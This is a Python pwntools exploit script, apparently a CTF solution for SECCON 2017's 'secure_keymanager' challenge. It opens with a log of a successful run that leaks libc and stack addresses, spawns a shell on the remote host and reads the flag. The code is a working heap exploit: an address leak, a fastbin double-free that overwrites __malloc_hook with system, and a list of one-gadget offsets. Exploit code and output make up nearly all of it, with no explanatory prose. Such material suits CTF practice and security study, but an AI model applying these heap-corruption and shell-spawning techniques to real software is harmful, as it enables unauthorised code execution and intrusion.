'''
root@ubuntu:/mnt/hgfs/shared/seccon/2017/secure_keymanager-f9d02e8a1149ff866cad10f001e8f23803bcac3c42ed7ffdcbe50da40e8afd12# python solve.py 1
[*] '/mnt/hgfs/shared/seccon/2017/secure_keymanager-f9d02e8a1149ff866cad10f001e8f23803bcac3c42ed7ffdcbe50da40e8afd12/secure_keymanager'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/mnt/hgfs/shared/seccon/2017/secure_keymanager-f9d02e8a1149ff866cad10f001e8f23803bcac3c42ed7ffdcbe50da40e8afd12/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to secure_keymanager.pwn.seccon.jp on port 47225: Done
[*] libc : 0x7fe745ba2000
[*] stack : 0x7ffd52b90fd0
[*] system : 0x7fe745be7390
[*] /bin/sh : 0x7fe745d2ed17
[*] Switching to interactive mode
$ ls
flag.txt
secure_keymanager
$ cat flag.txt
SECCON{C4n_y0u_b347_h34p_45lr?}
$
[*] Closed connection to secure_keymanager.pwn.seccon.jp port 47225
'''

from pwn import *
import sys, time

host = 'secure_keymanager.pwn.seccon.jp'
port = '47225'

context.binary = "./secure_keymanager"
binary = ELF("./secure_keymanager")
libc = ELF("./libc-2.23.so")

if len(sys.argv) == 1:
    p = process(["./secure_keymanager"])
    pause()

else:
    p = remote(host, port)

master = "aSiagaming\x70"
target = 0x6020c2

p.recvuntil(">> ")
p.send("/bin/sh\x00ng\x70")
p.recvuntil(">> ")
p.send("aSiagaming\x70")
#p.sendlineafter(">> ", "aSiagaming")
#p.sendlineafter(">> ", "aSiagaming")

def add(length, title, key):
    p.sendlineafter(">> ", "1")
    p.sendlineafter("...", str(length))
    p.sendlineafter("...", title)
    p.sendlineafter("...", key)

def show():
    p.sendlineafter(">> ", "2")

def edit(name, pw, index, key, shell=False):
    p.sendlineafter(">> ", "3")
    p.recvuntil(">> ")
    p.send("/bin/sh\x00ng\x70")
    p.recvuntil(">> ")
    p.send("aSiagaming\x70")
    p.sendlineafter("...", str(index))
    p.recvuntil("...")
    if shell:
        p.send(key)
    else:
        p.sendline(key)

def remove(index, name, pw):
    p.sendlineafter(">> ", "4")
    p.recvuntil(">> ")
    p.send("/bin/sh\x00ng\x70")
    p.recvuntil(">> ")
    p.send("aSiagaming\x70")
    p.sendlineafter("...", str(index))

def change_pw(user_id, user_pw):
    p.sendlineafter(">> ", "9")
    p.recvuntil(">> ")
    p.send("/bin/sh\x00ng\x70")
    p.recvuntil(">> ")
    p.send("aSiagaming\x70")

add(0x68 - 0x20, "A" * 8, "a" * 8)      # 0
add(0x68 - 0x20, "B" * 8, "b" * 8)      # 1
add(0x68 - 0x20, "C" * 8, "c" * 8)      # 2
add(0x68 - 0x20, "D" * 8, "d" * 8)      # 3
edit("aSiagaming\x70", "aSiagaming\x70", 0, "A" * (0x68 - 0x20 - 1), True)
p.sendlineafter(">> ", "9")
p.recvuntil(" >> ")
p.send("A" * 0x18)
p.recvuntil("A" * 0x18)
libc_base = u64(p.recv(6).ljust(8, "\x00")) - 0x3c5620
log.info("libc : " + hex(libc_base))

p.sendlineafter(">> ", "9")
p.recvuntil(" >> ")
p.send("A" * 0x38)
p.recvuntil("A" * 0x38)
stack = u64(p.recv(6).ljust(8, "\x00"))
log.info("stack : " + hex(stack))

system = libc_base + 0x45390
binsh = libc_base + 0x18cd17
magic = libc_base + 0xf0274
hook = libc_base + 0x3c4b10
'''
0x45216    execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a    execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0274    execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1117    execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

log.info("system : " + hex(system))
log.info("/bin/sh : " + hex(binsh))

remove(0, master, master)
remove(1, master, master)
remove(0, master, master)
# target hook - 0x13
add(0x68 - 0x20, p64(hook - 0x13), "a" * 8)      # double-free
add(0x68 - 0x20, "B" * 8, "b" * 8)      # 1
add(0x68 - 0x20, p64(hook - 0x13), "a" * 8)      # double-free
add(0x68 - 0x20, "A" * 3 + p64(system), "/bin/sh\x00")      # double-free done
#add(0x68 - 0x20, "A" * (0x10 - 2) + p64(0x601f9a), p64(0xcafebabe))      # double-free done

p.sendlineafter(">> ", "1")
p.sendlineafter("...", str(0x6020c0 - 0x20))

#edit("aSiagaming\x70", "aSiagaming\x70", 0, "A" * 0x20, True)

p.interactive()
